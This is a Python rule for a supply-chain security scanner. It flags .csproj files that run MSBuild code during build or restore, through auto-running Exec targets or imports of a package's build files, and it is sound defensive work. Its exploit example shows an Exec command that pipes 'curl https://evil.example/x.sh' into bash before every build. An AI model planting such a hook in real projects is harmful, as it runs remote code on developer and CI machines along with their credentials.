"""NUGET-018. Project runs build-time MSBuild logic at restore/build."""
from __future__ import annotations

import re
import xml.etree.ElementTree as ET
from pathlib import Path

from ...base import Finding, Severity
from ...rule import Rule
from ..base import NuGetContext, NuGetProject

RULE = Rule(
    id="NUGET-018",
    title="Project runs build-time MSBuild logic at restore/build",
    severity=Severity.HIGH,
    owasp=("CICD-SEC-4", "CICD-SEC-3"),
    esf=("ESF-S-VERIFY-DEPS",),
    cwe=("CWE-829", "CWE-94"),
    recommendation=(
        "Move build-time shell-outs out of the project file, or gate "
        "them behind an explicit, reviewed opt-in. Two shapes trip "
        "this rule:\n\n"
        "1. An ``<Exec>`` task in a ``<Target>`` wired to a build / "
        "restore phase via ``BeforeTargets`` / ``AfterTargets`` runs "
        "an arbitrary command on every build, in the developer shell "
        "and the CI runner with whatever credentials those carry. "
        "Prefer a checked-in, reviewed build script invoked "
        "explicitly over an auto-running ``<Exec>``; if codegen is "
        "unavoidable, pin the tool version and review the command.\n\n"
        "2. A ``PackageReference`` with ``GeneratePathProperty=\"true\"`` "
        "feeding an ``<Import Project=\"$(Pkg...)\\build\\...\" />`` "
        "auto-imports a package's MSBuild ``.props`` / ``.targets`` "
        "(the .NET analog of an npm ``postinstall``). Remove the "
        "manual import, or vet the package's ``build/`` payload and "
        "pin it by version.\n\n"
        "The point is that nothing in a package restore or a routine "
        "``dotnet build`` should be able to execute attacker-"
        "controlled host commands without a human having reviewed "
        "exactly what runs."
    ),
    docs_note=(
        "Re-reads each ``*.csproj`` and fires on two high-signal "
        "shapes of build-time code execution:\n\n"
        "* an ``<Exec>`` task nested in a ``<Target>`` whose "
        "``BeforeTargets`` or ``AfterTargets`` names a build / "
        "restore phase (``Build``, ``Restore``, ``Compile``, "
        "``Pack``, ``Publish``, and the common pre/post hooks), so "
        "the command runs automatically; and\n"
        "* an ``<Import>`` whose ``Project`` references a generated "
        "package path property (``$(Pkg...)``), which pulls a "
        "package's ``build/`` MSBuild logic into the build.\n\n"
        "The rule inspects structure, not command content, so a "
        "legitimate codegen ``<Exec>`` is flagged too (see the "
        "known false-positive note). ``packages.config`` projects "
        "and non-``.csproj`` inputs are skipped."
    ),
    known_fp=(
        "Many projects use a build-phase ``<Exec>`` for legitimate "
        "codegen (T4, protobuf, a version-stamp script). The rule "
        "flags the execution surface, not malice, since the command "
        "string alone can't be trusted to stay benign. Review the "
        "command; if it's a trusted in-repo script, suppress per "
        "project with a one-line rationale.",
    ),
    incident_refs=(
        "MSBuild build-time execution is the .NET parallel of the "
        "npm lifecycle-script attack class: a package ships "
        "``build/<id>.props`` / ``.targets`` that MSBuild auto-"
        "imports, or a project carries a ``BeforeTargets=\"Build\"`` "
        "``<Exec>``, so attacker-controlled commands run during a "
        "routine restore / build with the runner's credentials.",
    ),
    exploit_example=(
        "<!-- Vulnerable: Exec wired to run before every build. -->\n"
        "<Project Sdk=\"Microsoft.NET.Sdk\">\n"
        "  <Target Name=\"Prebuild\" BeforeTargets=\"Build\">\n"
        "    <Exec Command=\"curl https://evil.example/x.sh | bash\" />\n"
        "  </Target>\n"
        "</Project>\n"
        "\n"
        "<!-- Vulnerable: a package's build logic imported via the\n"
        "     generated path property. -->\n"
        "<Project Sdk=\"Microsoft.NET.Sdk\">\n"
        "  <ItemGroup>\n"
        "    <PackageReference Include=\"Some.Pkg\" Version=\"1.0.0\"\n"
        "                      GeneratePathProperty=\"true\" />\n"
        "  </ItemGroup>\n"
        "  <Import Project=\"$(PkgSome_Pkg)\\build\\evil.targets\" />\n"
        "</Project>\n"
        "\n"
        "<!-- Safe: no auto-running Exec, no package build import.\n"
        "     Codegen lives in a reviewed script invoked explicitly. -->"
    ),
)


_MSBUILD_NS = re.compile(r"^\{[^}]+\}")

#: Target hooks that cause a Target to run as part of a normal
#: restore / build / pack / publish, so an ``<Exec>`` inside is
#: auto-invoked rather than opt-in.
_BUILD_PHASES: frozenset[str] = frozenset({
    "build",
    "beforebuild",
    "afterbuild",
    "prepareforbuild",
    "restore",
    "compile",
    "corecompile",
    "beforecompile",
    "aftercompile",
    "pack",
    "publish",
    "resolvereferences",
    "resolveassemblyreferences",
    "_generaterestoregraphfile",
})


def _strip_ns(tag: str) -> str:
    return _MSBUILD_NS.sub("", tag)


def _attr_ci(elem: ET.Element, name: str) -> str | None:
    """Return an attribute value by case-insensitive name (MSBuild
    attribute names are case-insensitive; ElementTree is not)."""
    lname = name.lower()
    for key, value in elem.attrib.items():
        if key.lower() == lname:
            return value
    return None


def _target_runs_at_build(target: ET.Element) -> bool:
    for attr in ("BeforeTargets", "AfterTargets"):
        raw = _attr_ci(target, attr)
        if not raw:
            continue
        for hook in raw.split(";"):
            if hook.strip().lower() in _BUILD_PHASES:
                return True
    return False


def _has_exec_descendant(target: ET.Element) -> bool:
    for descendant in target.iter():
        if _strip_ns(descendant.tag) == "Exec":
            return True
    return False


#: A ``$(Pkg<Id>)`` reference (the GeneratePathProperty-generated
#: package-path property). Distinct from a user property that merely
#: starts with ``Pkg`` (``$(PkgVersion)``, ``$(PkgOutputPath)``), which
#: is filtered out below by cross-checking the project's PropertyGroups.
_PKG_PROP_RE = re.compile(r"\$\((Pkg[A-Za-z0-9_]+)\)", re.IGNORECASE)


def _user_property_names(root: ET.Element) -> set[str]:
    """Lowercased names of every property declared in a PropertyGroup."""
    names: set[str] = set()
    for pg in root.iter():
        if _strip_ns(pg.tag) == "PropertyGroup":
            for child in pg:
                names.add(_strip_ns(child.tag).lower())
    return names


def _offenders(root: ET.Element) -> list[str]:
    out: list[str] = []
    user_props = _user_property_names(root)
    for elem in root.iter():
        tag = _strip_ns(elem.tag)
        if tag == "Target":
            if _target_runs_at_build(elem) and _has_exec_descendant(elem):
                name = _attr_ci(elem, "Name") or "(unnamed)"
                hook = (
                    _attr_ci(elem, "BeforeTargets")
                    or _attr_ci(elem, "AfterTargets")
                    or ""
                )
                out.append(f"<Exec> in target {name!r} (runs at {hook})")
        elif tag == "Import":
            project = _attr_ci(elem, "Project") or ""
            for m in _PKG_PROP_RE.finditer(project):
                if m.group(1).lower() in user_props:
                    continue  # a user-defined property, not a package path
                out.append(f"<Import> of a package build path: {project}")
                break
    return out


def check(project: NuGetProject, ctx: NuGetContext) -> Finding:
    if not project.path.lower().endswith(".csproj"):
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=project.path,
            description="Not a .csproj; build-time MSBuild logic not audited.",
            recommendation=RULE.recommendation, passed=True,
        )

    proj_path = Path(project.path)
    if not proj_path.is_absolute() and ctx.scan_root is not None:
        proj_path = ctx.scan_root / proj_path
    try:
        root = ET.parse(str(proj_path)).getroot()
    except (ET.ParseError, OSError):
        return Finding(
            check_id=RULE.id, title=RULE.title, severity=RULE.severity,
            resource=project.path,
            description="Project could not be re-read; nothing to audit.",
            recommendation=RULE.recommendation, passed=True,
        )

    offenders = _offenders(root)
    passed = not offenders
    desc = (
        "No auto-running <Exec> task and no package build-path "
        "<Import>; the project runs no build-time code at restore "
        "or build."
        if passed else
        f"{len(offenders)} build-time code-execution site / sites: "
        f"{'; '.join(offenders[:5])}"
        f"{'…' if len(offenders) > 5 else ''}. These run during a "
        f"routine restore / build with the runner's credentials."
    )
    return Finding(
        check_id=RULE.id, title=RULE.title, severity=RULE.severity,
        resource=project.path, description=desc,
        recommendation=RULE.recommendation, passed=passed,
    )
